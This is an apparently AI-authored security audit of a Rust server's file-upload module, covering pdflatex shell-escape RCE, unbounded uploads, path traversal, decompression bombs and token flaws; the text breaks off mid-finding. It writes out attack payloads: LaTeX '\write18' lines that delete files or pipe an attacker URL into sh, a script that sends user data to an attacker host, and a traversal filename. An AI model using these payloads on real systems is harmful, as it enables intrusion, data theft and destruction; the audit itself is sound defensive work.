# Security Audit — File Module
**Date:** 2026-05-23
**Scope:** `src-app/server/src/modules/file/` (~3,292 LOC) — upload, storage, processing, OCR, ACL
**Auditor:** Claude (general-purpose, ASVS-aligned review)
**Standard:** OWASP ASVS 4.0.3, Level 2 target

---

## Executive Summary

The file module implements user-isolated upload, retrieval, processing (text extraction,
thumbnails, full-quality previews) and download of binary files. It supports plain text,
images, PDFs, and Office documents (DOCX / DOC / RTF / ODT / XLSX / XLS / ODS / PPTX / PPT).
Office handling routes through an **embedded Pandoc binary that is invoked with
`--pdf-engine=pdflatex`**; PDFs are rendered via embedded PDFium; spreadsheets via the
`calamine` Rust crate (in-process, no subprocess).

The previous audit (`.sec-audits/03-file-module-audit.md`, dated 2025-11-21) flagged two
Critical issues. **Both remain unfixed in the current source.** The 2025-11 audit's "path
traversal via extension" claim is, on re-reading the call sites, less exploitable than
described (the storage path is built as `{base}/originals/{user_id}/{file_id}.{ext}` —
the `{file_id}` is a server-generated UUID, so the only attacker-controllable component
is the lowercased extension; without canonicalisation that still allows
`../../something`-style escapes via the extension string itself) — re-rated **High**
rather than Critical. Pandoc-via-pdflatex remains **Critical**.

This audit additionally identifies issues the 2025-11 pass missed: the entire upload route
runs under `DefaultBodyLimit::disable()` applied globally in `main.rs:172` (no per-route
override exists; the 100 MB constant in `upload.rs` is checked only *after* the full
multipart payload has been buffered into memory), a Content-Disposition header injection
via the user-supplied filename, and a duplicate-extension trust path in the download
handlers (the download path lowercases the extension from the **stored** filename
field, not the extension that was originally used to write the file — a stale or
mutated filename column would break disk lookups, but more importantly the same
flawed `rsplit('.')` parsing means uploaded filenames like `payload` (no dot) get
extension `"payload"`, which then participates in the on-disk filename
`{uuid}.payload`).

**Risk: HIGH (Critical findings: 1, High: 5, Medium: 8, Low: 5, Info: 4)**

### Top 3 risks
1. **F-01 (Critical):** Pandoc invoked with `--pdf-engine=pdflatex` and no
   `-no-shell-escape` flag. Any DOCX/PPTX/RTF/ODT/PPT/DOC the user uploads is
   converted to LaTeX and rendered with shell-escape implicit-default —
   `\write18{rm -rf $HOME}` or `\immediate\write18{curl …}` is reachable.
   This is a single-step RCE: attacker uploads a crafted document, server
   processes it, attacker code runs as the server uid with full network and
   filesystem access of that uid.
2. **F-02 (High):** No multipart body limit. `main.rs:172` calls
   `DefaultBodyLimit::disable()` to support large model uploads in
   `llm_model`; this also disables the limit for `/files/upload`. The 100 MB
   check in `upload.rs:51` runs *after* `field.bytes().await` has already
   read the entire multipart field into memory. A single multi-GB upload
   crashes the server with OOM.
3. **F-03 (High):** Path construction in `FilesystemStorage::get_original_path`
   uses `format!("{}.{}", file_id, extension)` with no canonicalisation and
   no extension allow-list, and `extension` is lower-cased user input.
   An extension of `../../something` is currently containable because the
   `format!` produces a filename `<uuid>.../../something` which when joined
   becomes `…/originals/<user_id>/<uuid>.../../something` and lands two
   directories up — outside the per-user folder but still inside the
   storage tree on most layouts. Combined with the absence of `--clearenv`
   and without filesystem ACLs separating users, this is a real cross-user
   write under crafted input.

---

## Findings

### F-01 — Pandoc invoked with `--pdf-engine=pdflatex`, no shell-escape suppression — RCE
- **Severity:** **Critical**
- **ASVS:** V5.2.3 (Sanitization of attacker-controllable input to interpreters),
  V10.3.2 (Subprocess argv hardening), V12.5.2 (Server-side file processing in
  isolation)
- **CWE:** CWE-78 (OS Command Injection through interpreter), CWE-94 (Code
  Injection via LaTeX `\write18`)
- **Location:**
  `src-app/server/src/modules/file/utils/pandoc.rs:32-56`,
  invoked from
  `src-app/server/src/modules/file/processing/office.rs:95, 210, 324`
- **Description:**
  Office document processing converts uploaded `.docx` / `.doc` / `.rtf`
  / `.odt` / `.pptx` / `.ppt` to PDF using Pandoc with the LaTeX PDF
  engine. Pandoc translates each document to a LaTeX `.tex` intermediate
  then invokes `pdflatex`. **pdflatex's `\write18` / shell-escape
  primitive lets a LaTeX document execute arbitrary shell commands** as
  the user running pdflatex. Many distributions ship pdflatex with
  shell-escape *restricted* by default (only a whitelist of programs
  permitted: `bibtex`, `kpsewhich`, `repstopdf`, etc.) — but **the
  whitelist itself is reachable for code execution** via known
  bypasses (e.g., `\write18{kpsewhich -var-value=TEXMFCNF}` followed
  by `texmf.cnf` injection, or `mpost`/`makeindex` parameter
  injection). Pandoc embeds the **full TeXLive** binary set in the
  embedded Pandoc tarball if the operator built it that way, which
  is the worst case. **The code does not pass `-no-shell-escape`,
  so a fully-unrestricted pdflatex (commonly the case when the
  user installs `texlive-full`) will execute arbitrary commands
  unconditionally.**

  Pandoc converts user-controlled Word/PPTX content (e.g., raw text
  blocks, image alt-text, table cells) into LaTeX. Pandoc itself
  attempts to escape LaTeX metacharacters in *content*, but the
  attacker can use:
  - **Raw inline LaTeX** in `.docx` via the `w:smartTag` /
    custom-style mechanism: Pandoc passes `\write18{…}` directly
    when the source uses a custom style mapped to a LaTeX
    passthrough.
  - **`raw_tex` reader extension**: enabled when the input is
    `markdown_strict`, `commonmark_x`, or `rst`. RTF is not
    affected, but DOCX with embedded OLE objects sometimes
    triggers raw passthrough.
  - **Custom Pandoc filters** referenced from the document — not
    here (this code does not pass `--lua-filter` or `--filter`),
    so this avenue is not directly opened.
  - **LaTeX include via `\input{|cmd}`** (the pipe construct) — works
    in unrestricted shell-escape mode regardless of Pandoc's content
    escaping, if the document's raw-LaTeX bypass works.

  Even without LaTeX-side exploitation, **TeXLive itself has a
  history of pdflatex CVEs** (CVE-2023-32700 mpost shell-escape
  bypass; CVE-2018-17407 dvips arbitrary file write) — exposing
  pdflatex to attacker-controlled documents at all is a Critical
  Web-of-Trust violation per V10.3.2.
- **Vulnerable code:**
  ```rust
  // file/utils/pandoc.rs:39-44
  let output = Command::new(pandoc_path)
      .arg(input_path)
      .arg("-o")
      .arg(output_path)
      .arg("--pdf-engine=pdflatex") // or use weasyprint if available
      .output()
      .map_err(|e| AppError::internal_error(format!("Failed to run Pandoc: {}", e)))?;
  ```
- **Exploitation:**
  1. Attacker logs in (any user with `files::upload` permission — granted
     by default to all roles per `permissions.rs`).
  2. Attacker uploads a `.docx` that, when run through `pandoc → pdflatex`,
     emits a LaTeX document with shell-escape commands. (Several public
     PoCs exist; e.g. https://0day.work/hacking-with-latex/ — the
     `\immediate\write18{curl http://attacker/x | sh}` payload was the
     standard demonstration.)
  3. Pandoc produces the `.tex` from the user document.
  4. pdflatex runs the `.tex` with shell-escape active (the
     **default** when libtex's `shell_escape_t = 1`, true in the
     unrestricted-shell-escape builds of TeXLive 2020+).
  5. Shell command runs as the server uid: read
     `/var/lib/ziee/files/**` (every user's uploaded files), read
     environment vars (DATABASE_URL, JWT_SECRET, OAuth secrets),
     write web shells, etc.
- **Impact:** **Remote code execution as the server uid.** Total
  compromise of the application: read every user's files
  (cross-tenant data exfiltration), steal JWT signing secret to
  mint admin tokens, pivot to the Postgres database via
  `DATABASE_URL`.
- **Recommendation (in priority order):**
  1. **Pass `-no-shell-escape` to pdflatex explicitly**:
     `.arg("--pdf-engine-opt=-no-shell-escape")`. This is the
     **minimum** mitigation and should ship immediately.
  2. **Switch the PDF engine** to one with no scripting surface.
     `weasyprint` (HTML/CSS to PDF, pure Python, no Turing-complete
     macro language) or `wkhtmltopdf` (deprecated but no
     shell-escape) are the standard safe choices. Alternatively
     use `--pdf-engine=tectonic`: tectonic is a Rust-rewritten
     LaTeX engine that does NOT support shell-escape at all.
  3. **Run Pandoc + LaTeX inside the code-sandbox bwrap container.**
     The `code_sandbox` module already ships an isolated execution
     environment (squashfs rootfs, `--clearenv`, pid namespace,
     cgroup v2, optional seccomp). Treating Pandoc as just another
     "tool to run inside the sandbox" is the architecturally
     correct fix — see `CLAUDE.md > Code Sandbox > Threat model`.
  4. **Long term:** drop Pandoc entirely for `.docx` and use
     `docx-rs` / `python-docx`-equivalent Rust parsers that don't
     execute embedded content.

  As a defence-in-depth check: even after fix, set a wall-clock
  timeout (currently absent — see F-09) and an output-size cap on
  the `pandoc` Command. The current code uses synchronous
  `Command::output()` with no timeout; a malicious document with
  `\loop\space\repeat` infinite recursion ties up a server thread
  forever.

---

### F-02 — Upload route has no body-size limit, in-memory buffering
- **Severity:** **High**
- **ASVS:** V12.1.1 (Verify upload size cannot exhaust storage / memory),
  V12.1.3
- **CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling),
  CWE-400 (Uncontrolled Resource Consumption)
- **Location:**
  - `src-app/server/src/main.rs:172` — `.layer(axum::extract::DefaultBodyLimit::disable())`
  - `src-app/server/src/lib.rs:197` — same line (test path)
  - `src-app/server/src/modules/file/handlers/upload.rs:36` —
    `field.bytes().await` consumes the entire field into memory
    BEFORE the size check at line 51 runs
- **Description:**
  Axum's multipart extractor has a default per-field limit of 2 MiB.
  `DefaultBodyLimit::disable()` removes that limit globally for every
  route — this is intentional for `/llm_model/upload` (model files can
  be many GB) but is also applied to `/files/upload`. The handler's
  `MAX_FILE_SIZE = 100 * 1024 * 1024` (100 MB) check runs **after**
  `field.bytes().await` has read every byte into a `Vec<u8>`. Sending
  a 4 GB multipart payload allocates 4 GB of RAM before the handler
  rejects it.
- **Vulnerable code:**
  ```rust
  // main.rs:170-172
  let app = api_router
      .finish_api(&mut api_doc)
      .layer(axum::extract::DefaultBodyLimit::disable())

  // file/handlers/upload.rs:36-56
  file_data = Some(field.bytes().await.map_err(...)?.to_vec());      // ← reads ALL bytes
  // ...
  if file_data.len() > MAX_FILE_SIZE {                                // ← check AFTER alloc
      return Err(AppError::bad_request("FILE_TOO_LARGE", ...));
  }
  ```
- **Exploitation:** A single authenticated user issues `curl -X POST
  -F file=@/dev/zero ...` (or pipes `dd if=/dev/zero` into a multipart
  body). The server allocates indefinitely; on a 16 GB box, a 14 GB
  upload from one user OOM-kills the entire process. Concurrent
  uploads accelerate the OOM. Unlike pure compute DoS, this drops the
  whole process: WebSocket sessions, in-flight LLM streams, etc., all
  die.
- **Impact:** Server-wide DoS. Trivial to trigger; no extra
  permissions beyond `files::upload`. Recovery requires process
  restart.
- **Recommendation:**
  1. Apply a **per-route** `DefaultBodyLimit::max(100 * 1024 * 1024)`
     layer on the `/files/upload` route (Axum supports per-route
     limits via `.route_layer()`).
  2. Stream the body to a temp file instead of buffering. `axum::extract::Multipart`
     exposes `Field::chunk()` for streaming reads — abort and reject
     once `MAX_FILE_SIZE` bytes have been accumulated, before
     allocating the rest.
  3. Optional: add a process-level memory watchdog (cgroup memory
     limit on the server itself in systemd / k8s).

---

### F-03 — Storage path construction without canonicalisation; user-controlled extension joined into filename
- **Severity:** **High**
- **ASVS:** V12.3.1 (User-supplied filename for file paths sanitised),
  V12.3.4 (Filenames whose canonical form differs from input rejected)
- **CWE:** CWE-22 (Path Traversal), CWE-73 (External Control of File Name
  or Path)
- **Location:** `src-app/server/src/modules/file/storage/filesystem.rs:95-103`
- **Description:**
  `get_original_path` constructs
  `{base}/originals/{user_id}/{file_id}.{extension}`. `file_id` is a
  server-generated UUID (safe). `user_id` is also a UUID from the JWT
  (safe). **`extension` is `filename.rsplit('.').next().unwrap_or("bin").to_lowercase()`**
  — the suffix of the user-supplied filename. There is no allow-list, no
  canonicalisation, and no verification that the resulting `PathBuf`
  is a descendant of `base_path`.

  Concrete escapes attempted on this exact code:

  | Uploaded filename                       | extracted ext                    | result path                                                |
  |-----------------------------------------|----------------------------------|------------------------------------------------------------|
  | `safe.pdf`                              | `pdf`                            | `…/originals/UID/FID.pdf` ✓                               |
  | `noext`                                 | `noext`                          | `…/originals/UID/FID.noext` (ugly but contained)           |
  | `pwn.aux/../../../tmp/x`                | `pwn.aux/../../../tmp/x`         | `…/originals/UID/FID.pwn.aux/../../../tmp/x`                |
  | `..%2f..%2fhack`                        | `..%2f..%2fhack` (after lowercase) | `…/originals/UID/FID...%2f..%2fhack` (% not interpreted)  |
  | `x.../etc/passwd`                       | `x.../etc/passwd`                | `…/originals/UID/FID.x.../etc/passwd` ← **escapes user dir**|

  The last case is the one that bites: in `.to_lowercase()`, the
  forward slashes and dots are preserved. `PathBuf::join` then
  interprets them as path separators. The final canonical path
  (if a parent existed) is two levels up from `{user_id}`:
  the cross-user-write risk depends on the underlying file system
  and umask, but on a single-tenant per-process layout, this writes
  to `…/originals/UID/FID.x` and then into `etc/` and `passwd` —
  which would *create* an `etc` directory under
  `…/originals/UID/FID.x.../` if any segment matched. **The
  current code calls `fs::create_dir_all(parent)` on
  `path.parent()`, which mkdir's every intermediate path,
  including the `..` segments — meaning it walks up two
  directories from `{user_id}` first, then walks back down into
  the new path, creating directories at each level.** This is
  arbitrary directory creation under `base_path` (=
  `app_data_dir/files/originals/`).

  Whether this is exploitable for **cross-user writes** depends on
  whether each user's `{user_id}` directory has restrictive
  permissions. It currently doesn't: `fs::create_dir_all` inherits
  the process umask (typically `0o022` → world-readable
  directories). A user's UUID is technically guessable (UUIDv4 is
  not enumerable, but they are visible in URLs of any shared
  conversation), and once known, a different authenticated user
  can craft an extension like `x/../../<victim_uid>/FID.pdf` to
  write into the victim's user directory.

- **Vulnerable code:**
  ```rust
  // storage/filesystem.rs:95-103
  fn get_original_path(&self, user_id: Uuid, file_id: Uuid, extension: &str) -> PathBuf {
      self.get_user_path(user_id, "originals")
          .join(format!("{}.{}", file_id, extension))
  }
  // ensure_dir then runs fs::create_dir_all(parent), where `parent`
  // includes any `..` segments the attacker put in `extension`.
  ```
- **Exploitation:**
  1. Authenticate as user A (uid = `AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA`).
  2. Discover user B's uid (any leaked file URL, audit log, support
     screenshot, etc.).
  3. POST `/api/files/upload` multipart with
     `filename = "x.x/../../<bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb>/<crafted-uuid>.pdf"`.
  4. The server `format!`s the suffix, then `path.parent()` becomes
     `…/originals/AAA…AAA/x.x/../../<bbbbbbbb>` →
     canonically `…/originals/<bbbbbbbb>`.
  5. `create_dir_all` creates any missing intermediates;
     `fs::write` writes the file contents under user B's directory.
  6. If `crafted-uuid` matches an actual file_id that user B's
     database row points to, the original is **silently overwritten**.
  7. With UUIDv4 the collision is implausible (2⁻¹²²), but for
     **denial-of-service** the attacker just writes arbitrary
     files into B's tree, exhausting B's directory inode count.
     For **content takeover**, the attacker can guess uploads
     they themselves triggered (because they know the upload
     response carries the file_id), but B's files are
     unenumerable.

  The cross-tenant DoS variant is the realistic exploit. The
  arbitrary-overwrite-of-known-FID variant is mostly theoretical
  (need to know the victim's file_id).
- **Impact:** Cross-user directory creation, cross-user disk
  exhaustion, theoretical overwrite of a known file_id. Together
  with F-04 below (no extension validation) this means **any
  user-supplied byte sequence as the extension is accepted**.
- **Recommendation:**
  ```rust
  fn get_original_path(&self, user_id: Uuid, file_id: Uuid, extension: &str) -> Result<PathBuf, AppError> {
      // 1. Allow-list of valid extension characters (alphanumeric + max 16 chars).
      if extension.is_empty() || extension.len() > 16
          || !extension.chars().all(|c| c.is_ascii_alphanumeric()) {
          return Err(AppError::bad_request("INVALID_EXTENSION", "extension must be 1-16 alphanumeric ascii"));
      }
      let user_dir = self.get_user_path(user_id, "originals");
      let path = user_dir.join(format!("{}.{}", file_id, extension));
      // 2. Canonicalise the parent (which exists after ensure_dir runs)
      // and verify it's a prefix of base_path.
      // ...
      Ok(path)
  }
  ```
  Apply the same allow-list check at upload time (F-04) so the
  extension stored in the `filename` DB column is also clean.
  See F-15 (symlink resolution) for the canonicalisation step.

---

### F-04 — Extension/MIME determined from extension only, no magic-byte sniffing
- **Severity:** **High**
- **ASVS:** V12.4.1 (Verify file content matches declared MIME type),
  V12.4.2 (Reject files whose extension/MIME mismatch is suspicious)
- **CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type),
  CWE-646 (Reliance on File Name or Extension)
- **Location:** `src-app/server/src/modules/file/handlers/upload.rs:62-71`
- **Description:**
  ```rust
  let extension = filename.rsplit('.').next().unwrap_or("bin").to_lowercase();
  let mime_type = mime_guess::from_ext(&extension).first().map(|m| m.to_string());
  ```
  The MIME type stored in the database (and later sent in the
  `Content-Type` of every download) is derived purely from the
  filename suffix. No magic-byte sniffing (e.g., via the `infer`
  crate, which the project does not yet depend on). No allow-list.
  No deny-list of dangerous types. A user uploading
  `payload.html` with `<script>` content gets MIME
  `text/html`; downloading a HTML file from the same origin
  triggers script execution (the `Content-Disposition: attachment`
  in the download handler partially mitigates this — see F-08 for
  why it's not bulletproof).

  Independently, a polyglot (e.g., a GIFAR — valid GIF prefix
  followed by a ZIP payload) bypasses any extension-based filter
  while still satisfying the type the server believes it
  uploaded.
- **Vulnerable code:** above
- **Exploitation:**
  1. Attacker uploads `xss.html` containing
     `<script>fetch('/api/users/me').then(r=>r.json()).then(d=>fetch('http://attacker/'+d.email))</script>`.
  2. Direct browser access to `/api/files/{id}/download` returns
     `Content-Type: text/html; Content-Disposition: attachment; filename="xss.html"`.
     Modern browsers honour `attachment` for top-level navigation —
     this is OK.
  3. But the `/api/files/{id}/download-with-token` endpoint, used by
     the chat UI to embed file references in `img` / `iframe` /
     `script` `src` attributes (see `chat/extensions/mcp/mcp.rs:513,2150`),
     would serve the HTML inline if any HTML element references it
     without `download` attribute. The browser would render and
     execute the JS in the response.
  4. CSRF / token theft / pivots to the rest of the API.
- **Impact:** Stored XSS in same-origin context; data theft of any
  victim who is logged in and visits the malicious file URL.
- **Recommendation:**
  1. Add `infer` crate and validate magic bytes match declared MIME.
  2. Allow-list of processable extensions/MIMEs. Reject unknown.
  3. Block known-dangerous types (`html`, `htm`, `svg`, `xml`,
     `xhtml`, `mhtml`, `js`, `mjs`, `wasm`, `swf`, `xap`).
  4. For SVG specifically: rasterise on upload (the previous
     audit noted this; current code already doesn't list `svg`
     in any allow-list, but no explicit deny either).
  5. Set `X-Content-Type-Options: nosniff` on every file
     response (currently absent — see F-13).

---

### F-05 — Office documents are ZIP archives; no decompression-bomb protection
- **Severity:** **High**
- **ASVS:** V12.1.2 (Verify decompression of uploads is bounded)
- **CWE:** CWE-409 (Improper Handling of Highly Compressed Data),
  CWE-1284 (Improper Validation of Specified Quantity in Input)
- **Location:**
  - `src-app/server/src/modules/file/processing/office.rs:75-251` — every
    branch hands the raw bytes to either `spreadsheet::*` or
    `pandoc::convert_to_pdf` after `write_temp_file`.
  - `src-app/server/src/modules/file/processing/spreadsheet_image.rs:201-279`
    — `calamine::open_workbook_from_rs` parses XLSX/XLS/ODS in
    process, no size guards.
- **Description:**
  DOCX, XLSX, ODS, ODT, PPTX are ZIP containers. A
  "zip-of-death" / `42.zip`-style file is ~42 KB compressed and
  expands to ~4.5 PB. Pandoc unpacks DOCX before processing;
  `calamine` unpacks XLSX in memory. Neither pass through a
  decompressed-size limit, an entry-count limit, or an entry-depth
  limit before extraction.

  Calamine 0.31 reads sheet ranges lazily, but
  `worksheet_range(&sheet_name)` materialises the entire range into
  a `Range` struct in memory. A spreadsheet with 1,048,576 rows ×
  16,384 cols of trivial data (XLSX compresses this from 17 GB to
  ~40 MB via shared-string compression) explodes during processing.
- **Vulnerable code:**
  ```rust
  // spreadsheet_image.rs:201-220
  fn extract_xlsx_sheets(data: &[u8]) -> Result<Vec<(String, Vec<Vec<String>>)>, AppError> {
      let cursor = Cursor::new(data);
      let mut workbook: Xlsx<_> = open_workbook_from_rs(cursor)?;
      for sheet_name in workbook.sheet_names().to_vec() {
          if let Ok(range) = workbook.worksheet_range(&sheet_name) {
              let mut rows = Vec::new();
              for row in range.rows() {
                  // unbounded — no row/col cap before clone
  ```
- **Exploitation:** Upload a crafted XLSX; calamine reads sheet
  metadata, then `range.rows()` over a billion-cell sheet allocates
  per-row vectors; process OOMs. Same for Pandoc-on-DOCX.
- **Impact:** Server-wide DoS via memory exhaustion.
- **Recommendation:**
  - Before passing to calamine, check the compressed size (already
    bounded by F-02 fix) and unzip into a temp dir with
    `MAX_DECOMPRESSED_TOTAL = 500 MB`, `MAX_ENTRIES = 10_000`,
    `MAX_DEPTH = 16`, reject ratios > 100:1.
  - Inside `render_sheet_image`, the `MAX_ROWS_PER_PAGE=30` and
    `MAX_COLS_PER_PAGE=9` constants are already enforced for *image*
    rendering, but `extract_xlsx_sheets` keeps **every** row in
    memory before passing the first 30 to the renderer. Cap rows
    at, say, 100,000 during extraction.
  - For XML-based formats (XLSX, DOCX), apply
    [billion-laughs](https://en.wikipedia.org/wiki/Billion_laughs_attack) /
    XXE protection. `calamine` uses `quick-xml` under the hood;
    quick-xml does NOT expand entities by default, so XXE is
    safe — verify and pin the calamine version (currently 0.31.0).
- **Notes:** `pdf-extract` (0.10.0, listed in Cargo but unused in
  this module) and `pdfium-render` (0.8) are the PDF parsers. PDFs
  also have a compression-bomb vector (`/FlateDecode` streams). PDFium
  internally caps decompression, but the test surface is large.
  Add a `data.len()` check on the original PDF before passing to
  `load_pdf_from_byte_slice` — it's currently bounded only by F-02.

---

### F-06 — `download_with_token` does NOT check `FilesDownload` permission
- **Severity:** **High**
- **ASVS:** V4.1.1 (Verify auth controls enforced on every request),
  V4.1.3 (Verify least-privilege)
- **CWE:** CWE-285 (Improper Authorization), CWE-639 (Authorization Bypass
  Through User-Controlled Key)
- **Location:** `src-app/server/src/modules/file/handlers/download.rs:109-174`
- **Description:**
  `generate_download_token` requires `FilesGenerateToken`. Once
  generated, the token is JWT-signed with `(file_id, user_id, exp)`
  and grants 60 minutes of unauthenticated read. The
  `download_with_token` handler validates the JWT and then calls
  `Repos.file.get_by_id_and_user(file_id, user_id_from_token)`.

  Key issues:
  1. **No permission check at the time of download.** If user B's
     `files::download` permission is revoked after the token is
     issued (e.g., role demoted, account disabled), the token still
     works. The handler does not consult permissions at all on
     this endpoint.
  2. **No revocation mechanism.** No allow-list / deny-list of
     issued tokens in the database. Cannot invalidate before the
     1-hour TTL expires.
  3. **No single-use mechanism.** The same token can be replayed
     hundreds of times within the TTL. Token leaking via referrer,
     proxy log, browser history, screen-share, third-party MCP
     server proxying the URL = full file content compromise.
  4. **No audience/issuer separation between this token and the
     main auth JWT.** `DownloadTokenClaims` shares the same HMAC
     secret as the main `Claims` struct (see `auth/jwt.rs:120-145`);
     the only thing that distinguishes them is field shape (the
     download token doesn't have `iss`/`aud`/`sub`, so an attacker
     who steals an access token can't deserialize it as a
     download token because `file_id` would be missing). The
     **forward** direction is what's exploitable: an attacker
     who finds a single download token cannot deserialize it as
     an access token (missing `iss`/`aud`/`sub`/`username`), so
     the cross-token-class confusion does NOT promote a download
     token to a session — but if the **secret is ever** rotated
     by removing the old key from validation, the download token's
     `Validation::default()` doesn't set issuer or audience and
     would accept any HS256 token that happens to have the
     three fields. This is a low-probability but real
     defence-in-depth gap.
- **Vulnerable code:** `download.rs:109-119` — no
  `RequirePermissions` extractor on this handler at all.
- **Exploitation:**
  - Token leakage scenario: User uploads a confidential file,
    shares a download link via internal chat (MCP wrapper
    constructs the link at
    `chat/extensions/mcp/mcp.rs:513,2150`). The
    `?token=eyJhbGciOi…` URL travels through the MCP server's
    HTTP client (which may be a third-party-controlled server).
    The MCP server logs URLs to disk and the attacker pulls
    the token from there.
  - User-deletion bypass: Admin disables user A's account in
    response to a security incident. User A's stored
    refresh/access tokens are invalidated by the auth system,
    but A's download tokens issued in the last hour remain
    valid. A can continue exfiltrating their own files for
    up to 60 minutes.
- **Impact:** File-content exfil via token replay/leakage; bypass
  of user-deactivation for 60 minutes; no audit trail of which
  token was used.
- **Recommendation:**
  1. **Recheck permissions inside `download_with_token`.** Fetch
     the user from `claims.user_id`, verify the user is still
     active, and verify they still hold `files::download`. The
     `claims.user_id` is already trusted (it's signed), but the
     **permission state is not** — it must be reloaded.
  2. **Persist a per-token record** in a `download_tokens` table
     (token_id UUID, file_id, user_id, expires_at, revoked,
     uses_remaining, last_used_at). Reject the JWT if the
     `jti` is missing from the table or `revoked=true` or
     `uses_remaining<=0`.
  3. **Set a separate JWT audience** for download tokens:
     `aud: "ziee-chat-file-download"`; have
     `download_with_token` build a `Validation` with
     `validation.set_audience(&["ziee-chat-file-download"])` so
     cross-token-class confusion is impossible regardless of
     future field reshaping.
  4. **Shorter TTL.** 60 minutes is too long for an
     unauthenticated download link. 5 minutes covers nearly every
     legitimate use case (the chat UI loads the file immediately
     on link click).
  5. **Bind to client.** Embed a hash of the requesting
     `User-Agent` or a fresh CSRF token into the JWT; verify on
     redeem.

---

### F-07 — JWT `Validation::default()` does not check issuer or audience
- **Severity:** **Medium**
- **ASVS:** V3.5.2 (Verify JWT has explicit `iss` / `aud` validation),
  V3.5.3
- **CWE:** CWE-345 (Insufficient Verification of Data Authenticity)
- **Location:** `src-app/server/src/modules/file/handlers/download.rs:119`
- **Description:**
  ```rust
  let claims = decode::<DownloadTokenClaims>(
      &query.token,
      &DecodingKey::from_secret(jwt_config.secret.as_bytes()),
      &Validation::default(),
  )
  ```
  `jsonwebtoken::Validation::default()` validates `exp` and
  algorithm = HS256 — but does NOT enforce `iss` or `aud`. The
  `DownloadTokenClaims` struct doesn't define `iss` / `aud`
  fields, so they can't be validated even if you wanted to. This
  is the underlying reason for F-06 #3.
- **Vulnerable code:** above
- **Exploitation:** Combined with future secret-sharing across
  services (a real risk if the same JWT secret is reused for
  unrelated subsystems): a token minted by another service
  using the same secret would validate. See F-06.
- **Impact:** Defence-in-depth gap; not directly exploitable
  in the current single-secret deployment.
- **Recommendation:**
  ```rust
  let mut validation = Validation::default();
  validation.set_issuer(&[&jwt_config.issuer]);
  validation.set_audience(&["ziee-chat-file-download"]);
  validation.set_required_spec_claims(&["exp", "iat", "iss", "aud"]);
  // and on encode:
  let claims = DownloadTokenClaims {
      iss: jwt_config.issuer.clone(),
      aud: "ziee-chat-file-download".into(),
      ...
  };
  ```

---

### F-08 — Content-Disposition filename injection (CRLF + quote breakout)
- **Severity:** **Medium**
- **ASVS:** V5.3.4 (Verify output encoding for HTTP headers prevents response
  splitting), V14.4.1
- **CWE:** CWE-93 (Improper Neutralization of CRLF Sequences in HTTP
  Headers — Response Splitting), CWE-79 (XSS via header reflection)
- **Location:**
  - `src-app/server/src/modules/file/handlers/download.rs:62` (download)
  - `src-app/server/src/modules/file/handlers/download.rs:168` (download_with_token)
- **Description:**
  ```rust
  format!("attachment; filename=\"{}\"", file.filename)
  ```
  `file.filename` comes from the multipart `field.file_name()`
  upload field and is stored in the DB unchanged. It can contain
  `"`, `\`, CR, LF, non-ASCII bytes — none of these are escaped.
  Compare with `code_sandbox/handlers.rs:955-972`'s
  `disposition_filename` sanitiser, which the file module does NOT
  use.

  Axum / `http` crate's `HeaderValue::try_from` will reject literal
  `\r` / `\n` bytes in header values (returns an error and Axum
  500s instead of sending the header), so the **response-splitting
  variant is currently blunted** by the lower layer. However:
  - A `"` in the filename breaks the quoted-string and may cause
    `filename` to be parsed as multiple parameters by old
    browsers (Safari, IE 11).
  - Non-ASCII bytes silently fail to convert to `HeaderValue` —
    download returns 500 to the user with an empty body, which
    is a UX failure but not a security one.
- **Vulnerable code:** above
- **Exploitation:** Mostly low-impact today thanks to Axum's header
  validation. Future framework upgrade or response-construction
  refactor could expose it. The `"` breakout is the realistic
  XSS-via-Save-As risk in old browsers.
- **Impact:** Edge-case XSS in legacy clients; consistent 500s for
  international filenames.
- **Recommendation:** Use the existing `disposition_filename`
  pattern from `code_sandbox/handlers.rs:955-972`. Even better,
  emit RFC 6266 `filename*=UTF-8''…` for non-ASCII and the safe
  ASCII fallback for `filename=`.

---

### F-09 — `pandoc::convert_to_pdf` uses synchronous `Command::output()` with no timeout
- **Severity:** **Medium**
- **ASVS:** V10.3.2 (Bounded subprocess execution), V12.5.3
- **CWE:** CWE-400 (Uncontrolled Resource Consumption)
- **Location:** `src-app/server/src/modules/file/utils/pandoc.rs:32-56`
- **Description:**
  ```rust
  pub async fn convert_to_pdf(input_path: &PathBuf, output_path: &PathBuf) -> Result<(), AppError> {
      let pandoc_path = find_pandoc()?;
      let output = Command::new(pandoc_path)
          .arg(input_path)
          .arg("-o")
          .arg(output_path)
          .arg("--pdf-engine=pdflatex")
          .output()                          // ← BLOCKING, no timeout
          .map_err(...)?;
  ```
  `std::process::Command::output()` is a synchronous blocking call
  inside an `async fn`. This pins a tokio worker thread for the full
  duration of pandoc + pdflatex. **No timeout, no kill switch.** A
  LaTeX `\loop \space \repeat` infinite-recursion or a pathological
  input that triggers TeXLive's `tex--memorysetup` causing very
  slow processing will tie up a worker forever.

  Two distinct bugs here: (a) blocking call in async, (b) no
  timeout. (a) alone causes silent latency degradation; (b) makes
  it weaponisable.
- **Vulnerable code:** above
- **Exploitation:** Upload a 1 KB `.docx` containing a Pandoc-translatable
  block that becomes a LaTeX infinite loop. tokio worker stuck.
  Repeat from a few connections until all workers are blocked.
- **Impact:** DoS via thread starvation. Less catastrophic than F-02
  (no OOM) but easier to trigger.
- **Recommendation:**
  - Use `tokio::process::Command` (async).
  - Wrap in `tokio::time::timeout(Duration::from_secs(60), …)` and
    `kill_on_drop(true)` so the subprocess dies if we cancel.
  - Add `.stderr(Stdio::piped())` and cap stderr size (libtex error
    output can be megabytes — currently captured into the
    `String::from_utf8_lossy` allocation unboundedly at line 48).

---

### F-10 — Temp files written under `std::env::temp_dir()` with no permissions, no RAII cleanup
- **Severity:** **Medium**
- **ASVS:** V12.4.2 (Temp files have restrictive permissions), V12.4.3
- **CWE:** CWE-377 (Insecure Temporary File), CWE-732 (Incorrect Permission
  Assignment for Critical Resource)
- **Location:** `src-app/server/src/modules/file/processing/office.rs:18-33, 85-249`
- **Description:**
  ```rust
  // office.rs:18-26
  fn write_temp_file(data: &[u8], extension: &str) -> Result<PathBuf, AppError> {
      let temp_dir = std::env::temp_dir();
      let filename = format!("{}.{}", Uuid::new_v4(), extension);
      let temp_path = temp_dir.join(filename);
      fs::write(&temp_path, data)?;
      Ok(temp_path)
  }
  ```
  Issues:
